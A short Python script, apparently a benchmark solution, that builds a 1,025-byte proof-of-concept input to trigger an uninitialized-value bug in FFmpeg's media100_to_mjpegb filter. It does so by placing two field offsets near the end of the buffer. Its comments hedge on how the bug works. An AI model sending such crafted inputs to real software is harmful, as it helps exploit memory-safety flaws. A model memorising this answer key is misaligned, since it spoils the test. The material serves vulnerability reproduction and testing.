import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the uninitialized value vulnerability in media100_to_mjpegb BSF.
        The vulnerability is caused by not clearing output buffer padding after shrinking the packet.
        We create a valid input that results in a small output packet (triggering shrink) from a large allocation.
        """
        # Ground truth length is 1025 bytes
        data = bytearray(1025)
        
        # The media100_to_mjpegb filter reads 32-bit big-endian offsets at 0x8 and 0xC.
        # These offsets point to the start of the two video fields in the input buffer.
        
        # We set offsets to point near the end of the buffer.
        # This results in small field sizes:
        # Field 1 size approx (1012 - 1000) = 12 bytes
        # Field 2 size approx (1025 - 1012) = 13 bytes
        
        # When the filter processes this, it likely allocates a buffer proportional to input size (1025),
        # writes the header and small fields, and then shrinks the packet.
        # The new padding falls into the uninitialized portion of the originally allocated buffer.
        
        # Set offset 1 (field 1) at index 8 to 1000
        struct.pack_into('>I', data, 8, 1000)
        
        # Set offset 2 (field 2) at index 12 to 1012
        struct.pack_into('>I', data, 12, 1012)
        
        return bytes(data)
